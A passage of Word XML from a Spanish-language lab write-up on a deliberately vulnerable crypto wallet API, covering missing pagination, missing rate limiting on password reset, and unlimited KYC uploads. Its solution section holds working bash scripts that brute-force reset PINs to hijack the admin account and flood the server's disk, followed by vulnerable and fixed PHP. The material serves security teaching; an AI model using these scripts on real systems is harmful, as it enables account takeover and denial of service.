          <w:color w:val="AAAAAA"/>
        </w:rPr>
        <w:t>――――――――――――――――――――――――――――――――――――――――</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Endpoints Involucrados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C3E50"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
              </w:rPr>
              <w:t>Metodo</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
            <w:shd w:val="clear" w:color="auto" w:fill="2C3E50"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
              </w:rPr>
              <w:t>Endpoint</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
            <w:shd w:val="clear" w:color="auto" w:fill="2C3E50"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:b/>
                <w:color w:val="FFFFFF"/>
              </w:rPr>
              <w:t>Descripcion</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>GET</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>/api/v1/wallets/history.php</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:t>Historial de transacciones (sin paginacion)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>POST</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>/api/v1/auth/reset.php</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:t>Restablecimiento de contrasena (sin rate limiting)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>POST</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:rPr>
                <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
                <w:sz w:val="20"/>
              </w:rPr>
              <w:t>/api/v1/kyc/upload.php</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:type="dxa" w:w="2880"/>
          </w:tcPr>
          <w:p>
            <w:r/>
            <w:r>
              <w:t>Carga de documentos KYC (sin limite de tamano)</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p>
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="AAAAAA"/>
        </w:rPr>
        <w:t>――――――――――――――――――――――――――――――――――――――――</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Dificultad</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Baja</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> - Las vulnerabilidades son directas de explotar, no requieren tecnicas avanzadas.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="AAAAAA"/>
        </w:rPr>
        <w:t>――――――――――――――――――――――――――――――――――――――――</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Pistas</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>Pista 1 - Extraccion masiva</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t xml:space="preserve">Consulta el endpoint de historial de transacciones sin incluir parametros de paginacion como </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>page</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> o </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>limit</w:t>
      </w:r>
      <w:r>
        <w:t>. Observa si la API devuelve todos los registros de una sola vez. ¿Cuantos registros devuelve? ¿Que impacto tendria esto si la tabla tiene millones de filas?</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>Pista 2 - Fuerza bruta sin limite</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Envia multiples peticiones consecutivas al endpoint de reset con diferentes valores de PIN. Cuenta cuantas puedes enviar por segundo. ¿Recibes algun error de tipo 429 (Too Many Requests)? Si no, significa que puedes iterar todos los PINs posibles sin restriccion.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>Pista 3 - Archivo sin limite</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Genera un archivo de gran tamano (por ejemplo, 100MB o mas) e intenta subirlo al endpoint de KYC. ¿El servidor lo acepta? ¿Hay algun mensaje de error sobre tamano maximo? Si no hay limite, un atacante puede llenar el disco del servidor.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="AAAAAA"/>
        </w:rPr>
        <w:t>――――――――――――――――――――――――――――――――――――――――</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Solucion</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>Ataque 1 - Extraccion Masiva sin Paginacion</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading5"/>
      </w:pPr>
      <w:r>
        <w:t>Paso 1 - Autenticarse</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="555555"/>
        </w:rPr>
        <w:t>[bash]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>curl -s -X POST http://localhost/appsec/api/v1/auth/login.php \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -H "Content-Type: application/json" \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -d '{"username":"carlos","password":"carlos2024"}'</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading5"/>
      </w:pPr>
      <w:r>
        <w:t>Paso 2 - Solicitar historial sin limite de paginacion</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="555555"/>
        </w:rPr>
        <w:t>[bash]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>curl -s -X GET "http://localhost/appsec/api/v1/wallets/history.php?wallet_id=1" \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -H "Authorization: Bearer &lt;TOKEN&gt;"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Respuesta esperada (ejemplo con dataset grande):</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="555555"/>
        </w:rPr>
        <w:t>[json]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>{</w:t>
        <w:br/>
        <w:t xml:space="preserve">  "wallet_id": 1,</w:t>
        <w:br/>
        <w:t xml:space="preserve">  "total_transactions": 50000,</w:t>
        <w:br/>
        <w:t xml:space="preserve">  "transactions": [</w:t>
        <w:br/>
        <w:t xml:space="preserve">    {"id": 1, "type": "deposit", "amount": "10.00", "date": "2023-01-01T00:00:00Z"},</w:t>
        <w:br/>
        <w:t xml:space="preserve">    {"id": 2, "type": "withdrawal", "amount": "2.50", "date": "2023-01-02T00:00:00Z"},</w:t>
        <w:br/>
        <w:t xml:space="preserve">    ...</w:t>
        <w:br/>
        <w:t xml:space="preserve">    {"id": 50000, "type": "deposit", "amount": "0.001", "date": "2024-12-31T23:59:59Z"}</w:t>
        <w:br/>
        <w:t xml:space="preserve">  ]</w:t>
        <w:br/>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>El servidor devuelve los 50,000 registros en una sola respuesta, consumiendo memoria y ancho de banda excesivos.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading5"/>
      </w:pPr>
      <w:r>
        <w:t>Paso 3 - Medir el impacto</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="555555"/>
        </w:rPr>
        <w:t>[bash]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># Medir tamano de la respuesta y tiempo</w:t>
        <w:br/>
        <w:t>curl -s -o /dev/null -w "Tamano: %{size_download} bytes\nTiempo: %{time_total}s\n" \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  "http://localhost/appsec/api/v1/wallets/history.php?wallet_id=1" \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -H "Authorization: Bearer &lt;TOKEN&gt;"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="AAAAAA"/>
        </w:rPr>
        <w:t>――――――――――――――――――――――――――――――――――――――――</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>Ataque 2 - Fuerza Bruta sin Rate Limiting</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading5"/>
      </w:pPr>
      <w:r>
        <w:t>Paso 1 - Solicitar restablecimiento de contrasena</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="555555"/>
        </w:rPr>
        <w:t>[bash]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>curl -s -X POST http://localhost/appsec/api/v1/auth/reset.php \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -H "Content-Type: application/json" \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -d '{"email":"admin@cryptovulnx.com","action":"request"}'</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading5"/>
      </w:pPr>
      <w:r>
        <w:t>Paso 2 - Script de fuerza bruta a maxima velocidad</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="555555"/>
        </w:rPr>
        <w:t>[bash]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>#!/bin/bash</w:t>
        <w:br/>
        <w:t># brute_force_no_limit.sh</w:t>
        <w:br/>
        <w:t>TARGET="http://localhost/appsec/api/v1/auth/reset.php"</w:t>
        <w:br/>
        <w:t>INTENTOS=0</w:t>
        <w:br/>
        <w:t>INICIO=$(date +%s)</w:t>
        <w:br/>
        <w:br/>
        <w:t>for pin in $(seq -w 0000 9999); do</w:t>
        <w:br/>
        <w:t xml:space="preserve">  INTENTOS=$((INTENTOS + 1))</w:t>
        <w:br/>
        <w:t xml:space="preserve">  response=$(curl -s -X POST "$TARGET" \</w:t>
        <w:br/>
        <w:t xml:space="preserve">    -H "Content-Type: application/json" \</w:t>
        <w:br/>
        <w:t xml:space="preserve">    -d "{\"email\":\"admin@cryptovulnx.com\",\"action\":\"verify\",\"pin\":\"$pin\",\"new_password\":\"pwned123\"}")</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">  # Verificar si alguna peticion recibe 429 (rate limit)</w:t>
        <w:br/>
        <w:t xml:space="preserve">  http_code=$(curl -s -o /dev/null -w "%{http_code}" -X POST "$TARGET" \</w:t>
        <w:br/>
        <w:t xml:space="preserve">    -H "Content-Type: application/json" \</w:t>
        <w:br/>
        <w:t xml:space="preserve">    -d "{\"email\":\"admin@cryptovulnx.com\",\"action\":\"verify\",\"pin\":\"$pin\"}")</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">  if [ "$http_code" == "429" ]; then</w:t>
        <w:br/>
        <w:t xml:space="preserve">    echo "[-] Rate limiting detectado en intento $INTENTOS"</w:t>
        <w:br/>
        <w:t xml:space="preserve">    break</w:t>
        <w:br/>
        <w:t xml:space="preserve">  fi</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">  if echo "$response" | grep -q "success"; then</w:t>
        <w:br/>
        <w:t xml:space="preserve">    FIN=$(date +%s)</w:t>
        <w:br/>
        <w:t xml:space="preserve">    DURACION=$((FIN - INICIO))</w:t>
        <w:br/>
        <w:t xml:space="preserve">    echo "[+] PIN encontrado: $pin"</w:t>
        <w:br/>
        <w:t xml:space="preserve">    echo "[+] Intentos realizados: $INTENTOS"</w:t>
        <w:br/>
        <w:t xml:space="preserve">    echo "[+] Tiempo total: ${DURACION} segundos"</w:t>
        <w:br/>
        <w:t xml:space="preserve">    echo "[+] NOTA: Ningun rate limiting fue aplicado"</w:t>
        <w:br/>
        <w:t xml:space="preserve">    break</w:t>
        <w:br/>
        <w:t xml:space="preserve">  fi</w:t>
        <w:br/>
        <w:t>done</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="555555"/>
        </w:rPr>
        <w:t>[bash]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>chmod +x brute_force_no_limit.sh &amp;&amp; ./brute_force_no_limit.sh</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Con version paralela usando xargs o herramientas como ffuf, los 10,000 PINs se prueban en segundos.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading5"/>
      </w:pPr>
      <w:r>
        <w:t>Paso 3 - Version paralela mas rapida</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="555555"/>
        </w:rPr>
        <w:t>[bash]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># Usando xargs para peticiones paralelas (10 hilos)</w:t>
        <w:br/>
        <w:t>seq -w 0000 9999 | xargs -I{} -P 10 curl -s -X POST \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  http://localhost/appsec/api/v1/auth/reset.php \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -H "Content-Type: application/json" \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -d '{"email":"admin@cryptovulnx.com","action":"verify","pin":"{}","new_password":"pwned123"}' \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -o /dev/null -w "PIN: {} -&gt; HTTP: %{http_code}\n" 2&gt;/dev/null | grep -v "401"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="AAAAAA"/>
        </w:rPr>
        <w:t>――――――――――――――――――――――――――――――――――――――――</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>Ataque 3 - Subida de Archivos sin Limite de Tamano</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading5"/>
      </w:pPr>
      <w:r>
        <w:t>Paso 1 - Generar un archivo de prueba grande</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="555555"/>
        </w:rPr>
        <w:t>[bash]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># Generar archivo de 100MB</w:t>
        <w:br/>
        <w:t>dd if=/dev/zero of=/tmp/huge_kyc_document.pdf bs=1M count=100</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading5"/>
      </w:pPr>
      <w:r>
        <w:t>Paso 2 - Subir el archivo al endpoint KYC</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="555555"/>
        </w:rPr>
        <w:t>[bash]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>curl -s -X POST http://localhost/appsec/api/v1/kyc/upload.php \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -H "Authorization: Bearer &lt;TOKEN&gt;" \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -F "document=@/tmp/huge_kyc_document.pdf" \</w:t>
        <w:br/>
        <w:t xml:space="preserve">  -F "document_type=passport"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:t>Respuesta esperada:</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="555555"/>
        </w:rPr>
        <w:t>[json]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>{</w:t>
        <w:br/>
        <w:t xml:space="preserve">  "status": "success",</w:t>
        <w:br/>
        <w:t xml:space="preserve">  "message": "Documento subido exitosamente",</w:t>
        <w:br/>
        <w:t xml:space="preserve">  "file_size": "104857600",</w:t>
        <w:br/>
        <w:t xml:space="preserve">  "filename": "huge_kyc_document.pdf"</w:t>
        <w:br/>
        <w:t>}</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>El servidor acepta el archivo de 100MB sin ningun error ni restriccion.</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading5"/>
      </w:pPr>
      <w:r>
        <w:t>Paso 3 - Repetir para agotar el almacenamiento</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="555555"/>
        </w:rPr>
        <w:t>[bash]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t># Subir multiples archivos grandes para agotar el disco</w:t>
        <w:br/>
        <w:t>for i in $(seq 1 50); do</w:t>
        <w:br/>
        <w:t xml:space="preserve">  echo "[*] Subiendo archivo $i de 100MB..."</w:t>
        <w:br/>
        <w:t xml:space="preserve">  curl -s -X POST http://localhost/appsec/api/v1/kyc/upload.php \</w:t>
        <w:br/>
        <w:t xml:space="preserve">    -H "Authorization: Bearer &lt;TOKEN&gt;" \</w:t>
        <w:br/>
        <w:t xml:space="preserve">    -F "document=@/tmp/huge_kyc_document.pdf" \</w:t>
        <w:br/>
        <w:t xml:space="preserve">    -F "document_type=passport" \</w:t>
        <w:br/>
        <w:t xml:space="preserve">    -o /dev/null -w "HTTP: %{http_code}\n"</w:t>
        <w:br/>
        <w:t>done</w:t>
        <w:br/>
        <w:t>echo "[*] Total subido: ~5GB"</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:spacing w:before="120" w:after="120"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:color w:val="AAAAAA"/>
        </w:rPr>
        <w:t>――――――――――――――――――――――――――――――――――――――――</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading3"/>
      </w:pPr>
      <w:r>
        <w:t>Remediacion</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>1. Implementar Paginacion Obligatoria</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="555555"/>
        </w:rPr>
        <w:t>[php]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>// VULNERABLE - Devuelve todas las transacciones</w:t>
        <w:br/>
        <w:t>$query = "SELECT * FROM transactions WHERE wallet_id = $wallet_id";</w:t>
        <w:br/>
        <w:t>$result = $conn-&gt;query($query);</w:t>
        <w:br/>
        <w:t>$transactions = [];</w:t>
        <w:br/>
        <w:t>while ($row = $result-&gt;fetch_assoc()) {</w:t>
        <w:br/>
        <w:t xml:space="preserve">    $transactions[] = $row;</w:t>
        <w:br/>
        <w:t>}</w:t>
        <w:br/>
        <w:t>echo json_encode(["transactions" =&gt; $transactions]);</w:t>
        <w:br/>
        <w:br/>
        <w:t>// SEGURO - Paginacion obligatoria con limites</w:t>
        <w:br/>
        <w:t>$page = isset($_GET['page']) ? max(1, intval($_GET['page'])) : 1;</w:t>
        <w:br/>
        <w:t>$limit = isset($_GET['limit']) ? min(100, max(1, intval($_GET['limit']))) : 20; // Maximo 100 por pagina</w:t>
        <w:br/>
        <w:t>$offset = ($page - 1) * $limit;</w:t>
        <w:br/>
        <w:br/>
        <w:t>// Obtener total de registros</w:t>
        <w:br/>
        <w:t>$stmt = $conn-&gt;prepare("SELECT COUNT(*) as total FROM transactions WHERE wallet_id = ?");</w:t>
        <w:br/>
        <w:t>$stmt-&gt;bind_param("i", $wallet_id);</w:t>
        <w:br/>
        <w:t>$stmt-&gt;execute();</w:t>
        <w:br/>
        <w:t>$total = $stmt-&gt;get_result()-&gt;fetch_assoc()['total'];</w:t>
        <w:br/>
        <w:br/>
        <w:t>// Obtener pagina actual</w:t>
        <w:br/>
        <w:t>$stmt = $conn-&gt;prepare("SELECT id, type, amount, date FROM transactions WHERE wallet_id = ? ORDER BY date DESC LIMIT ? OFFSET ?");</w:t>
        <w:br/>
        <w:t>$stmt-&gt;bind_param("iii", $wallet_id, $limit, $offset);</w:t>
        <w:br/>
        <w:t>$stmt-&gt;execute();</w:t>
        <w:br/>
        <w:t>$transactions = $stmt-&gt;get_result()-&gt;fetch_all(MYSQLI_ASSOC);</w:t>
        <w:br/>
        <w:br/>
        <w:t>echo json_encode([</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "page" =&gt; $page,</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "limit" =&gt; $limit,</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "total" =&gt; $total,</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "total_pages" =&gt; ceil($total / $limit),</w:t>
        <w:br/>
        <w:t xml:space="preserve">    "transactions" =&gt; $transactions</w:t>
        <w:br/>
        <w:t>]);</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="Heading4"/>
      </w:pPr>
      <w:r>
        <w:t>2. Implementar Rate Limiting</w:t>
      </w:r>
    </w:p>
    <w:p>
      <w:pPr>
        <w:pStyle w:val="CodeBlock"/>
        <w:shd w:val="clear" w:color="auto" w:fill="F4F4F4"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="555555"/>
        </w:rPr>
        <w:t>[php]</w:t>
        <w:br/>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>// SEGURO - Rate limiting basado en IP y usuario</w:t>
        <w:br/>
        <w:t>function checkRateLimit($identifier, $max_requests = 5, $window_seconds = 900) {</w:t>
        <w:br/>
        <w:t xml:space="preserve">    global $conn;</w:t>
        <w:br/>
        <w:br/>
        <w:t xml:space="preserve">    $stmt = $conn-&gt;prepare("SELECT COUNT(*) as attempts FROM rate_limits</w:t>
        <w:br/>
        <w:t xml:space="preserve">                            WHERE identifier = ? AND created_at &gt; DATE_SUB(NOW(), INTERVAL ? SECOND)");</w:t>
        <w:br/>
